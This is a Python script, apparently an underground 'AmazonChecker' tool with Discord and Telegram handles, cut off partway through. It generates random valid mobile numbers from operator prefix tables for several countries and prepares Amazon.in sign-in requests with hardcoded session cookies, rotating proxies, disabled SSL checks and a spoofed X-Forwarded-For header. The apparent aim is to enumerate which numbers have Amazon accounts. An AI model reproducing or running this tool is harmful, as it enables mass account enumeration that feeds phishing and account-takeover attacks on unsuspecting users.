import requests, urllib3
from multiprocessing import Pool
import os
import random
import phonenumbers
import fade
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging
import time
import threading
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import queue
from functools import partial
import signal
import sys
import warnings

# Désactiver les avertissements liés aux requêtes HTTPS non vérifiées
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings('ignore', message='Unverified HTTPS request')

# Désactiver les logs de niveau WARNING pour urllib3.connectionpool
logging.getLogger('urllib3.connectionpool').setLevel(logging.ERROR)

# ----- Configuration des opérateurs par pays -----
# Pays-Bas (Netherlands) : liste d'opérateurs et préfixes
netherlands_prefixes = {
    # KPN
    "0610": "KPN",
    "0612": "KPN",
    "0613": "KPN",
    "0620": "KPN",
    "0622": "KPN",
    "0623": "KPN",
    "0630": "KPN",
    "0651": "KPN",
    "0653": "KPN",
    "0657": "KPN",
    # Vodafone
    "0611": "Vodafone",
    "0615": "Vodafone",
    "0621": "Vodafone",
    "0625": "Vodafone",
    "0627": "Vodafone",
    "0629": "Vodafone",
    "0637": "Vodafone",
    "0646": "Vodafone",
    "0650": "Vodafone",
    "0652": "Vodafone",
    "0654": "Vodafone",
    "0655": "Vodafone",
    # T-Mobile
    "0614": "T-Mobile",
    "0624": "T-Mobile",
    "0634": "T-Mobile",
    "0641": "T-Mobile",
    "0642": "T-Mobile",
    "0643": "T-Mobile",
    "0681": "T-Mobile",
    # O2 (Telefónica)
    "0616": "O2",
    "0617": "O2",
    "0619": "O2",
    "0626": "O2",
    "0633": "O2",
    "0644": "O2",
    "0645": "O2",
    "0647": "O2",
    "0649": "O2",
    # Tele2
    "0636": "Tele2",
    "0640": "Tele2",
    # Orange (France Telecom)
    "0618": "Orange",
    "0628": "Orange",
    "0638": "Orange",
    "0639": "Orange",
    "0648": "Orange",
}

# Préfixes fixes des Pays-Bas par zone
netherlands_fixed_prefixes = {
    "010": "Rotterdam",
    "020": "Amsterdam",
    "023": "Haarlem",
    "024": "Nijmegen",
    "026": "Arnhem",
    "030": "Utrecht",
    "033": "Amersfoort",
    "035": "Hilversum",
    "036": "Almere",
    "038": "Zwolle",
    "040": "Eindhoven",
    "043": "Maastricht",
    "045": "Heerlen",
    "046": "Sittard",
    "050": "Groningen",
    "053": "Enschede",
    "055": "Apeldoorn",
    "058": "Leeuwarden",
    "070": "La Haye",
    "071": "Leiden",
    "072": "Alkmaar",
    "073": "'s-Hertogenbosch",
    "074": "Hengelo",
    "075": "Zaandam",
    "076": "Breda",
    "077": "Venlo",
    "078": "Dordrecht",
    "079": "Zoetermeer",
}

# Allemagne : liste enrichie d'opérateurs et indicatifs fixes
german_prefixes = {
    # Deutsche Telekom (T-Mobile et MVNO affiliés)
    "0151": "Deutsche Telekom",
    "0160": "Deutsche Telekom",
    "0170": "Deutsche Telekom",
    "0171": "Deutsche Telekom",
    "0175": "Deutsche Telekom",
    # Vodafone
    "0152": "Vodafone",
    "0162": "Vodafone",
    "0172": "Vodafone",
    "0173": "Vodafone",
    "0174": "Vodafone",
    # O2 (Telefónica Allemagne / O2 d'E-Plus)
    "0155": "O2",
    "0157": "O2",
    "0159": "O2",
    "0163": "O2",
    "0176": "O2",
    "0177": "O2",
    "0178": "O2",
    "0179": "O2",
    # Autres opérateurs / MVNO
    "01556": "1&1 AG",
    "015678": "Satellite",
    "015679": "Satellite",
    "015888": "TelcoVillage GmbH",
    "01569": "Freenet Mobile",
    "0166": "Congstar"
}
# Indicatifs géographiques en Allemagne
german_fixed_prefixes = {
    "030": "Berlin",
    "040": "Hambourg",
    "069": "Frankfurt",
    "089": "Munich",
    "0211": "Düsseldorf"
}

# Espagne : liste enrichie d'opérateurs et indicatifs fixes  
spain_prefixes = {
    # Movistar (600 à 609)
    "600": "Movistar",
    "601": "Movistar",
    "602": "Movistar",
    "603": "Movistar",
    "604": "Movistar",
    "605": "Movistar",
    "606": "Movistar",
    "607": "Movistar",
    "608": "Movistar",
    "609": "Movistar",
    # Vodafone (620 à 629)
    "620": "Vodafone",
    "621": "Vodafone",
    "622": "Vodafone",
    "623": "Vodafone",
    "624": "Vodafone",
    "625": "Vodafone",
    "626": "Vodafone",
    "627": "Vodafone",
    "628": "Vodafone",
    "629": "Vodafone",
    # Orange (630 à 639)
    "630": "Orange",
    "631": "Orange",
    "632": "Orange",
    "633": "Orange",
    "634": "Orange",
    "635": "Orange",
    "636": "Orange",
    "637": "Orange",
    "638": "Orange",
    "639": "Orange",
    # Yoigo (640 à 649)
    "640": "Yoigo",
    "641": "Yoigo",
    "642": "Yoigo",
    "643": "Yoigo",
    "644": "Yoigo",
    "645": "Yoigo",
    "646": "Yoigo",
    "647": "Yoigo",
    "648": "Yoigo",
    "649": "Yoigo",
    # Autres MVNO
    "650": "Tuenti",
    "651": "Tuenti",
    "652": "MásMóvil",
    "653": "MásMóvil"
}
# Indicatifs géographiques en Espagne
spain_fixed_prefixes = {
    "91": "Madrid",
    "93": "Barcelone",
    "95": "Bilbao",
    "98": "Séville"
}

# France : liste enrichie d'opérateurs et indicatifs fixes
france_prefixes = {
    # Orange (06 et 07)
    "0601": "Orange",
    "0602": "Orange",
    "0603": "Orange",
    "0604": "Orange",
    "0605": "Orange",
    "0606": "Orange",
    "0607": "Orange",
    "0608": "Orange",
    "0609": "Orange",
    "0610": "Orange",
    "0611": "Orange",
    "0612": "Orange",
    "0613": "Orange",
    "0614": "Orange",
    "0700": "Orange",
    "0701": "Orange",
    "0702": "Orange",
    "0703": "Orange",
    "0704": "Orange",
    # SFR (06 et 07)
    "0615": "SFR",
    "0616": "SFR",
    "0617": "SFR",
    "0618": "SFR",
    "0619": "SFR",
    "0620": "SFR",
    "0621": "SFR",
    "0622": "SFR",
    "0623": "SFR",
    "0624": "SFR",
    "0705": "SFR",
    "0706": "SFR",
    "0707": "SFR",
    "0708": "SFR",
    "0709": "SFR",
    # Bouygues Telecom (06 et 07)
    "0625": "Bouygues Telecom",
    "0626": "Bouygues Telecom",
    "0627": "Bouygues Telecom",
    "0628": "Bouygues Telecom",
    "0629": "Bouygues Telecom",
    "0630": "Bouygues Telecom",
    "0631": "Bouygues Telecom",
    "0632": "Bouygues Telecom",
    "0633": "Bouygues Telecom",
    "0634": "Bouygues Telecom",
    "0710": "Bouygues Telecom",
    "0711": "Bouygues Telecom",
    "0712": "Bouygues Telecom",
    "0713": "Bouygues Telecom",
    "0714": "Bouygues Telecom",
    # Free Mobile (06 et 07)
    "0635": "Free Mobile",
    "0636": "Free Mobile",
    "0637": "Free Mobile",
    "0638": "Free Mobile",
    "0639": "Free Mobile",
    "0640": "Free Mobile",
    "0641": "Free Mobile",
    "0642": "Free Mobile",
    "0643": "Free Mobile",
    "0644": "Free Mobile",
    "0715": "Free Mobile",
    "0716": "Free Mobile",
    "0717": "Free Mobile",
    "0718": "Free Mobile",
    "0719": "Free Mobile",
    # MVNOs
    "0645": "La Poste Mobile",
    "0646": "La Poste Mobile",
    "0647": "NRJ Mobile",
    "0648": "NRJ Mobile",
    "0649": "Virgin Mobile",
    "0650": "Virgin Mobile",
    "0651": "Lycamobile",
    "0652": "Lebara Mobile",
    "0653": "Syma Mobile",
    "0654": "Auchan Telecom"
}
# Indicatifs géographiques en France
france_fixed_prefixes = {
    "01": "Île-de-France",
    "02": "Nord-Ouest",
    "03": "Nord-Est",
    "04": "Sud-Est",
    "05": "Sud-Ouest",
    "09": "Numéros non géographiques"
}

# Belgique : liste enrichie d'opérateurs et indicatifs fixes
belgium_prefixes = {
    # Proximus (0470 à 0475)
    "0470": "Proximus",
    "0471": "Proximus",
    "0472": "Proximus",
    "0473": "Proximus",
    "0474": "Proximus",
    "0475": "Proximus",
    # Orange Belgium (0480 à 0485)
    "0480": "Orange",
    "0481": "Orange",
    "0482": "Orange",
    "0483": "Orange",
    "0484": "Orange",
    "0485": "Orange",
    # Base (0490 à 0495)
    "0490": "Base",
    "0491": "Base",
    "0492": "Base",
    "0493": "Base",
    "0494": "Base",
    "0495": "Base"
}
# Indicatifs géographiques en Belgique
belgium_fixed_prefixes = {
    "02": "Anvers",
    "03": "Bruxelles",
    "09": "Liège"
}

# Suisse : liste enrichie d'opérateurs et indicatifs fixes
swiss_prefixes = {
    # Paging Services & Mobile
    "074": "Paging Services",
    "075": "Swisscom",
    "076": "Sunrise (avec MVNOs: Yallo, TalkTalk, Lebara, MTV Mobile, Aldi)",
    "077": "MVNOs variés (M-Budget, Wingo, Mucho, Lycamobile, ok.-mobile, Tele2)",
    "078": "Salt Mobile",
    "079": "Swisscom"
}
# Indicatifs géographiques en Suisse
swiss_fixed_prefixes = {
    "021": "Lausanne",
    "022": "Geneva",
    "024": "Yverdon/Aigle",
    "026": "Fribourg",
    "027": "Valais",
    "031": "Bern",
    "032": "Biel/Bienne/Neuchâtel/Solothurn/Jura",
    "033": "Berner Oberland",
    "034": "Bern-Emme",
    "041": "Suisse centrale",
    "043": "Zurich",
    "044": "Zurich",
    "051": "Réseaux ferroviaires",
    "052": "Winterthur/Schaffhausen",
    "055": "Rapperswil",
    "056": "Baden/Zurzach",
    "058": "Réseaux d'affaires",
    "061": "Bâle",
    "062": "Olten–Langenthal/Aargau-Ouest",
    "071": "Suisse orientale",
    "081": "Coire",
    "091": "Tessin/Moesa"
}

# Portugal : liste enrichie d'opérateurs et indicatifs fixes
portugal_prefixes = {
    # MEO (ancien TMN)
    "911": "MEO",
    "912": "MEO",
    "913": "MEO",
    "914": "MEO",
    "915": "MEO",
    "916": "MEO",
    "917": "MEO",
    "918": "MEO",
    # Vodafone
    "921": "Vodafone",
    "922": "Vodafone",
    "923": "Vodafone",
    "924": "Vodafone",
    "925": "Vodafone",
    "926": "Vodafone",
    "927": "Vodafone",
    "928": "Vodafone",
    "929": "Vodafone",
    # NOS (ancien Optimus)
    "931": "NOS",
    "932": "NOS",
    "933": "NOS",
    "934": "NOS",
    "935": "NOS",
    "936": "NOS",
    "937": "NOS",
    "938": "NOS",
    "939": "NOS",
    # MVNO et autres
    "910": "NOWO",
    "930": "NOWO",
    "940": "Lycamobile",
    "941": "Lycamobile",
    "942": "Lycamobile",
    "943": "Lycamobile"
}
# Indicatifs géographiques au Portugal
portugal_fixed_prefixes = {
    "21": "Lisbonne",
    "22": "Porto",
    "231": "Mealhada",
    "232": "Viseu",
    "233": "Figueira da Foz",
    "234": "Aveiro",
    "239": "Coimbra",
    "253": "Braga",
    "291": "Funchal (Madère)",
    "296": "Ponta Delgada (Açores)"
}

# Kenya : liste enrichie d'opérateurs et indicatifs fixes
kenya_prefixes = {
    # Safaricom
    "0700": "Safaricom",
    "0701": "Safaricom",
    "0702": "Safaricom",
    "0703": "Safaricom",
    "0704": "Safaricom",
    "0705": "Safaricom",
    "0706": "Safaricom",
    "0707": "Safaricom",
    "0708": "Safaricom",
    "0709": "Safaricom",
    "0710": "Safaricom",
    "0711": "Safaricom",
    "0712": "Safaricom",
    "0713": "Safaricom",
    "0714": "Safaricom",
    "0715": "Safaricom",
    "0716": "Safaricom",
    "0717": "Safaricom",
    "0718": "Safaricom",
    "0719": "Safaricom",
    "0720": "Safaricom",
    "0721": "Safaricom",
    "0722": "Safaricom",
    "0723": "Safaricom",
    "0724": "Safaricom",
    "0725": "Safaricom",
    "0726": "Safaricom",
    "0727": "Safaricom",
    "0728": "Safaricom",
    "0729": "Safaricom",
    # Airtel
    "0730": "Airtel",
    "0731": "Airtel",
    "0732": "Airtel",
    "0733": "Airtel",
    "0734": "Airtel",
    "0735": "Airtel",
    "0736": "Airtel",
    "0737": "Airtel",
    "0738": "Airtel",
    "0739": "Airtel",
    # Telkom Kenya
    "0750": "Telkom Kenya",
    "0751": "Telkom Kenya",
    "0752": "Telkom Kenya",
    "0753": "Telkom Kenya",
    "0754": "Telkom Kenya",
    "0755": "Telkom Kenya",
    "0756": "Telkom Kenya",
    # Jamii Telecommunications (JTL)
    "0770": "JTL",
    "0771": "JTL",
    "0772": "JTL",
    "0773": "JTL",
    "0774": "JTL",
    "0775": "JTL",
    "0776": "JTL",
    # Equitel (Finserve)
    "0763": "Equitel",
    "0764": "Equitel",
    "0765": "Equitel",
    "0766": "Equitel",
    # Sema Mobile
    "0767": "Sema Mobile",
    "0768": "Sema Mobile",
    # Faiba 4G
    "0747": "Faiba 4G",
    "0748": "Faiba 4G",
    "0757": "Faiba 4G",
    "0758": "Faiba 4G",
    "0759": "Faiba 4G"
}
# Indicatifs géographiques au Kenya
kenya_fixed_prefixes = {
    "020": "Nairobi",
    "041": "Mombasa",
    "042": "Malindi",
    "043": "Kwale",
    "044": "Machakos",
    "045": "Athi River",
    "046": "Garissa",
    "051": "Nakuru",
    "052": "Kericho",
    "053": "Eldoret",
    "057": "Kisumu"
}

# Afrique du Sud : liste enrichie d'opérateurs et indicatifs fixes
south_africa_prefixes = {
    # Vodacom
    "0710": "Vodacom",
    "0711": "Vodacom",
    "0712": "Vodacom",
    "0713": "Vodacom",
    "0714": "Vodacom",
    "0715": "Vodacom",
    "0716": "Vodacom",
    "0717": "Vodacom",
    "0718": "Vodacom",
    "0719": "Vodacom",
    "0720": "Vodacom",
    "0721": "Vodacom",
    "0722": "Vodacom",
    "0723": "Vodacom",
    "0724": "Vodacom",
    "0725": "Vodacom",
    "0726": "Vodacom",
    "0727": "Vodacom",
    "0728": "Vodacom",
    "0729": "Vodacom",
    # MTN
    "0730": "MTN",
    "0731": "MTN",
    "0732": "MTN",
    "0733": "MTN",
    "0734": "MTN",
    "0735": "MTN",
    "0736": "MTN",
    "0737": "MTN",
    "0738": "MTN",
    "0739": "MTN",
    "0760": "MTN",
    "0761": "MTN",
    "0762": "MTN",
    "0763": "MTN",
    "0764": "MTN",
    "0765": "MTN",
    "0766": "MTN",
    "0767": "MTN",
    "0768": "MTN",
    "0769": "MTN",
    # Cell C
    "0740": "Cell C",
    "0741": "Cell C",
    "0742": "Cell C",
    "0743": "Cell C",
    "0744": "Cell C",
    "0745": "Cell C",
    "0746": "Cell C",
    "0747": "Cell C",
    "0748": "Cell C",
    "0749": "Cell C",
    "0770": "Cell C",
    "0771": "Cell C",
    "0772": "Cell C",
    "0773": "Cell C",
    "0774": "Cell C",
    "0775": "Cell C", 
    # Telkom
    "0810": "Telkom",
    "0811": "Telkom",
    "0812": "Telkom",
    "0813": "Telkom",
    "0814": "Telkom",
    "0815": "Telkom",
    "0816": "Telkom",
    "0817": "Telkom",
    "0818": "Telkom",
    # Mobile providers
    "061": "Cell C",
    "071": "Vodacom",
    "072": "Vodacom",
    "073": "MTN",
    "074": "Cell C",
    "076": "Vodacom",
    "079": "Vodacom",
    "081": "Telkom Mobile",
    "082": "Vodacom",
    "083": "MTN",
    "084": "MTN",
}

# Indicatifs géographiques en Afrique du Sud
south_africa_fixed_prefixes = {
    "010": "Johannesburg",
    "011": "Johannesburg",
    "012": "Pretoria",
    "013": "Nelspruit",
    "014": "Northern",
    "015": "Polokwane",
    "016": "Vaal Triangle",
    "017": "Ermelo",
    "018": "North West",
    "021": "Cape Town",
    "022": "Malmesbury",
    "023": "Worcester",
    "024": "Non-attribué",
    "027": "Vredendal",
    "028": "Caledon",
    "031": "Durban",
    "032": "KZN",
    "033": "Pietermaritzburg",
    "034": "Newcastle",
    "035": "Zululand",
    "036": "Ladysmith",
    "039": "Port Shepstone",
    "040": "Bisho",
    "041": "Port Elizabeth",
    "042": "Humansdorp",
    "043": "East London",
    "044": "Garden Route",
    "045": "Queenstown",
    "046": "Grahamstown",
    "047": "Mthatha",
    "048": "Cradock",
    "049": "Graaff-Reinet",
    "051": "Bloemfontein",
    "053": "Kimberley",
    "054": "Upington",
    "056": "Kroonstad",
    "057": "Welkom"
}

# Dictionnaires globaux par pays pour accès facile
country_prefixes = {
    "FR": france_prefixes,
    "BE": belgium_prefixes,
    "ES": spain_prefixes,
    "PT": portugal_prefixes,
    "CH": swiss_prefixes,
    "DE": german_prefixes,
    "KE": kenya_prefixes,
    "ZA": south_africa_prefixes,
    "NL": netherlands_prefixes
}

country_fixed_prefixes = {
    "FR": france_fixed_prefixes,
    "BE": belgium_fixed_prefixes,
    "ES": spain_fixed_prefixes,
    "PT": portugal_fixed_prefixes,
    "CH": swiss_fixed_prefixes,
    "DE": german_fixed_prefixes,
    "KE": kenya_fixed_prefixes,
    "ZA": south_africa_fixed_prefixes,
    "NL": netherlands_fixed_prefixes
}

# Configuration partagée
config = {
    "max_threads": 50,  # Nombre maximum de threads parallèles
    "check_batch_size": 100,  # Nombre de numéros à vérifier en parallèle
    "default_check_timeout": 60,  # Timeout par défaut pour une vérification (secondes)
    "batch_size_adjustment_period": 5  # Période d'ajustement de la taille de batch (minutes)
}

# Variables partagées entre les threads
stats = {
    "checked": 0,
    "valid": 0,
    "invalid": 0,
    "errors": 0,
    "start_time": time.time()
}

# Utilisation de locks pour protéger les accès concurrents
stats_lock = threading.Lock()
output_lock = threading.Lock()

# Blacklists/cooldowns pour les IP problématiques
blacklisted_proxies = set()
proxy_cooldowns = {}
proxy_stats = {}
proxy_last_use = {}

# Queue pour les proxies
proxy_pool = queue.Queue()

# Charger les proxies
valid_proxies = []

# Définir le niveau de journalisation
logging.basicConfig(level=logging.INFO, 
                   format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                   handlers=[logging.FileHandler("amazon_checker.log"), 
                             logging.StreamHandler()])

# Désactiver les journaux de requests et urllib3
logging.getLogger("requests").setLevel(logging.WARNING)
logging.getLogger("urllib3").setLevel(logging.WARNING)

os.system("cls" if os.name == "nt" else "clear")
os.system('title AmazonChecker ^| by @eboy.uhq')

method = "Semi Spoofed"

banner = """
    _                                      ____ _               _             
   / \\   _ __ ___   __ _ _______  _ __    / ___| |__   ___  ___| | _____ _ __ 
  / _ \\ | '_ ` _ \\ / _` |_  / _ \\| '_ \\  | |   | '_ \\ / _ \\/ __| |/ / _ \\ '__|
 / ___ \\| | | | | | (_| |/ / (_) | | | | | |___| | | |  __/ (__|   <  __/ |   
/_/   \\_\\_| |_| |_|\\__,_/___\\___/|_| |_|  \\____|_| |_|\\___|\\___|_|\\_\\___|_|   discord : @eboy.uhq
"""

tatt = """
   .  .    '    .          '                      . 
                 .             '          o     o *     ' +                             
           o     '   . .   .          '           '                               +     
            '        +    '                             +                     '        +
        .                                          .   '                        
      '                    ~~+               '       .  '                       
  '      +                                .                     '                
       |    .      o                                  .    .:'                  
 .     |         |  .      .                          (_.'       +             .   
                -+-     o     o       .                             .               . 
    .        .   |                   '      '  +            o    ~~+              
     +             *             .       @Testeur2cc                 .             +     
    '          .         .             +            .                             .    
                    _|_'        '         .    .-.                             *   
       .    +        |           '         +    ) )      .                       t.me/chez8675  <3     
              +  ( (                                                            
.       +   '     `-'                                     .                        
. +              .             +           +  .    +    +   
[1] generer de la NL
[2] check un numero de tel
[3] check fichier
"""

faded_text = fade.fire(banner)
tatt2 = fade.fire(tatt)
print(faded_text)
print(tatt2)


def load_proxies(file_path):
    proxies = []
    if os.path.exists(file_path):
        with open(file_path, "r") as f:
            for line in f:
                proxy = line.strip()
                # Ajoute "http://" si le schéma est absent
                if proxy and not proxy.startswith("http"):
                    proxy = "http://" + proxy
                proxies.append(proxy)
    return proxies

# Chargement des proxies sans validation
proxy_list = load_proxies("proxies.txt")
valid_proxies = proxy_list if proxy_list else []  # Liste vide si aucun proxy

# Création d'un pool de proxies réutilisables avec stockage des stats
proxy_pool = queue.Queue()
proxy_stats = {}
for proxy in valid_proxies:
    proxy_pool.put({"http": proxy, "https": proxy})
    proxy_stats[proxy] = {"success": 0, "failure": 0, "speed": 0}

# Proxies globalement blacklistés
blacklisted_proxies = set()

# Statistiques globales
stats = {
    "checked": 0,
    "valid": 0,
    "invalid": 0,
    "errors": 0,
    "start_time": time.time()
}
stats_lock = threading.Lock()

# Cache des résultats pour éviter de vérifier plusieurs fois les mêmes numéros
results_cache = {}
results_cache_lock = threading.Lock()

if proxy_list:
    print(f"{len(proxy_list)} proxies loaded")
else:
    print("Aucun proxy chargé. Mode direct activé.")


class Amazon:
    def __init__(self, num):
        self.url = "https://www.amazon.in/ap/signin"
        self.num = num
        self.cookies = {
            "session-id": "262-6899214-0753700", 
            "session-id-time": "2289745062l", 
            "i18n-prefs": "INR", 
            "csm-hit": "tb:6NWTTM14VJ00ZAVVBZ3X+b-36CP76CGQ52N3TB0HZG8|1659025064788&t:1659025064788&adb:adblk_no", 
            "ubid-acbin": "257-4810331-3732018", 
            "session-token": "tyoeHgowknphx0Y/CBaiVwnBiwbhUb1PRTvQZQ+07Tq9rmkRD6bErsUDwgq6gu+tA53K6WEAMwOb3pN4Ti3PSFoo+I/Jt5qIEDEMHIeRo1CrE264ogGDHsjge/CwWUZ9bVZtbo32ej/ZPQdm8bYeu6TQhca+UH7Wm9OOwBGoPl7dfoUk79QLYEz69Tt3ik4zMJom8jfgI227qMPuaMaAsw=="
        }
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "DNT": "1",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://www.amazon.in",
            "Connection": "keep-alive",  # Changé de 'close' à 'keep-alive' pour les connexions persistantes
            "X-Forwarded-For": "127.0.0.1",
            "Referer": "https://www.amazon.in/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.in%2F%3Fref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=inflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1"
        }
        self.data = {
            "appActionToken": "Aok8C9I71Cr17vp22ONGvDUXR8Yj3D",
            "appAction": "SIGNIN_PWD_COLLECT",
            "subPageType": "SignInClaimCollect",
            "openid.return_to": "ape:aHR0cHM6Ly93d3cuYW1hem9uLmluLz9yZWZfPW5hdl95YV9zaWduaW4=",
            "prevRID": "ape:MzZDUDc2Q0dRNTJOM1RCMEhaRzg=",
            "workflowState": "eyJ6aXAiOiJERUYiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiQTI1NktXIn0.tCHWdlv4kSSigZCZiGfSCYgnReddxq7c0cUpf0dxYqYzWU-ZHIL0mQ.eP-cXQNtVyBr4q_g.fNRQAD5f18IU0nmqT7IwklJZV-_b60As-_dvyVd4MMjDpiMoGFJ0edbmuL8GJKT_BEE7ClwIpUYOtUtejr7v8qCRy4iD6bg_eBRSnTmZiXzVsx4EuL241zhoriZ7FpXS2seG82sx85C2udl1sPRQyKnO1zIqulOCechL_LzBmIRDv9ngzfij-nYmjWrDpZvAXiKCclR9v0UYh_SqjjOIrStMC53AlWjH-hYdDkXWSeTyHchFi9Ij4ndOgJb9tKNucA4_j7Uy-R0wvB9zlwEfQNa3394guXjjz6IR3TVMjw41bySCYbHLf6j5oj-5xh6UZm2CsW7DE5gqbHmlq5Nv8zLvTRTO9HJvM9Wr36R1eDRN.wZAX4qr9VTROJR9qdWbHfw", 
            "email": self.num, 
            "password": "",
            "create": "0"
        }
        
# Fonction pour créer une session avec retry et timeouts optimisés
def create_session():
    session = requests.Session()
    retry_strategy = Retry(
        total=2,  # Moins de tentatives
        backoff_factor=0.1,  # Backoff minimal
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["GET", "POST"]
    )
    adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=100, pool_maxsize=100)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    session.verify = False  # Désactive la vérification SSL
    return session

# Pool de sessions réutilisables
session_pool = queue.Queue()
for _ in range(min(100, os.cpu_count() * 6)):  # Beaucoup plus de sessions
    session_pool.put(create_session())

def genph(nb, prefix, region):
    numbers = []
    # Configuration des préfixes pour les territoires d'outre-mer
    domtom_config = {
        "+590": {
            "GP": {"pattern": "690"},  # Guadeloupe
            "MF": {"pattern": "690"},  # Saint-Martin
            "BL": {"pattern": "690"}   # Saint-Barthélemy
        },
        "+594": {"GF": {"pattern": "694"}},  # Guyane Française
        "+596": {"MQ": {"pattern": "696"}},  # Martinique
        "+262": {
            "RE": {"pattern": "692"},  # Réunion
            "YT": {"pattern": "639"}   # Mayotte
        }
    }
    while len(numbers) < nb:
        # Gestion des territoires d'outre-mer avec leurs préfixes spécifiques
        if prefix in ["+590", "+594", "+596", "+262"]:
            if prefix in domtom_config:
                # Si la région est spécifiée, utiliser sa configuration
                if region and region in domtom_config[prefix]:
                    reg = region
                    pattern = domtom_config[prefix][region]["pattern"]
                # Sinon utiliser la première configuration disponible
                else:
                    reg = list(domtom_config[prefix].keys())[0]
                    pattern = domtom_config[prefix][reg]["pattern"]
                candidate = f"{prefix}{pattern}{random.randint(0, 999999):06d}"
        else:
            chosen_prefix = prefix
            reg = region
            if reg == "BE":
                candidate = f"{chosen_prefix}4{random.choice(['7','8','9'])}{random.randint(1000000, 9999999):07d}"
            elif reg == "FR":
                candidate = f"{chosen_prefix}{random.choice(['6','7'])}{random.randint(10000000, 99999999):08d}"
            elif reg == "CH":
                # Format pour la Suisse: +41 7x xxx xx xx (mobiles)
                candidate = f"{chosen_prefix}7{random.randint(0, 9)}{random.randint(100000, 999999):06d}"
            else:
                candidate = f"{chosen_prefix}{random.randint(600000000, 799999999):09d}"
        try:
            phone_number = phonenumbers.parse(candidate, reg)
            if phonenumbers.is_valid_number(phone_number):
                formatted = phonenumbers.format_number(phone_number, phonenumbers.PhoneNumberFormat.E164)
                if formatted not in numbers:
                    numbers.append(formatted)
        except Exception:
            continue

    with open("NotCheckedNL.txt", "w") as file:
        file.write("\n".join(numbers))
    
    print(f"{len(numbers)} valid numbers generated out of {nb} demanded")
    return numbers

# Fonction pour générer UN candidat
def gen_candidate(prefix, region):
    """
    Génère un numéro de téléphone valide pour le préfixe et la région spécifiés
    en utilisant les préfixes d'opérateurs spécifiques au pays.
    """
    # Configuration des préfixes pour les territoires d'outre-mer
    domtom_config = {
        "+590": {
            "GP": {"pattern": "690"},  # Guadeloupe
            "MF": {"pattern": "690"},  # Saint-Martin
            "BL": {"pattern": "690"}   # Saint-Barthélemy
        },
        "+594": {"GF": {"pattern": "694"}},  # Guyane Française
        "+596": {"MQ": {"pattern": "696"}},  # Martinique
        "+262": {
            "RE": {"pattern": "692"},  # Réunion
            "YT": {"pattern": "639"}   # Mayotte
        }
    }
    
    chosen_prefix = prefix
    
    # Générer un candidat numéro de téléphone valide
    candidate = ""
    
    if region:
        reg = region.upper()
        
        # Vérifier si nous sommes dans un territoire d'outre-mer
        if chosen_prefix in domtom_config and reg in domtom_config[chosen_prefix]:
            config = domtom_config[chosen_prefix][reg]
            pattern = config["pattern"]
            candidate = f"{chosen_prefix}{pattern}{random.randint(100000, 999999):06d}"
        
        # Si nous avons des préfixes par opérateur pour ce pays
        elif reg in country_prefixes:
            if reg == "FR" and "FR" in country_prefixes:
                # Choisir un préfixe aléatoire parmi les opérateurs français
                operator_prefix = random.choice(list(france_prefixes.keys()))
                # Format français: +33 6XX XX XX XX
                suffix_length = 8 - len(operator_prefix) + 1  # +1 car on enlève le premier chiffre
                candidate = f"{chosen_prefix}{operator_prefix[1:]}{random.randint(0, 10**suffix_length-1):0{suffix_length}d}"
                
            elif reg == "BE" and "BE" in country_prefixes:
                # Choisir un préfixe aléatoire parmi les opérateurs belges
                operator_prefix = random.choice(list(belgium_prefixes.keys()))
                # Format belge: +32 4XX XX XX XX
                suffix_length = 8 - len(operator_prefix) + 1  # +1 car on enlève le premier chiffre
                candidate = f"{chosen_prefix}{operator_prefix[1:]}{random.randint(0, 10**suffix_length-1):0{suffix_length}d}"
                
            elif reg == "ES" and "ES" in country_prefixes:
                # Choisir un préfixe aléatoire parmi les opérateurs espagnols
                operator_prefix = random.choice(list(spain_prefixes.keys()))
                # Format espagnol: +34 6XX XXX XXX
                suffix_length = 9 - len(operator_prefix)
                candidate = f"{chosen_prefix}{operator_prefix}{random.randint(0, 10**suffix_length-1):0{suffix_length}d}"
                
            elif reg == "PT" and "PT" in country_prefixes:
                # Choisir un préfixe aléatoire parmi les opérateurs portugais
                operator_prefix = random.choice(list(portugal_prefixes.keys()))
                # Format portugais: +351 9XX XXX XXX
                suffix_length = 9 - len(operator_prefix)
                candidate = f"{chosen_prefix}{operator_prefix}{random.randint(0, 10**suffix_length-1):0{suffix_length}d}"
                
            elif reg == "DE" and "DE" in country_prefixes:
                # Choisir un préfixe aléatoire parmi les opérateurs allemands
                operator_prefix = random.choice(list(german_prefixes.keys()))
                # Format allemand: +49 1XX XXXXXXX
                suffix_length = 10 - len(operator_prefix) + 1  # +1 car on enlève le premier chiffre
                candidate = f"{chosen_prefix}{operator_prefix[1:]}{random.randint(0, 10**suffix_length-1):0{suffix_length}d}"
                
            elif reg == "CH" and "CH" in country_prefixes:
                # Choisir un préfixe aléatoire parmi les opérateurs suisses
                operator_prefix = random.choice(list(swiss_prefixes.keys()))
                # Format suisse: +41 7XX XXX XX XX
                suffix_length = 9 - len(operator_prefix) + 1  # +1 car on enlève le premier chiffre
                candidate = f"{chosen_prefix}{operator_prefix[1:]}{random.randint(0, 10**suffix_length-1):0{suffix_length}d}"
                
            elif reg == "KE" and "KE" in country_prefixes:
                # Format kenyan avec préfixe opérateur
                operator_prefix = random.choice(list(kenya_prefixes.keys()))
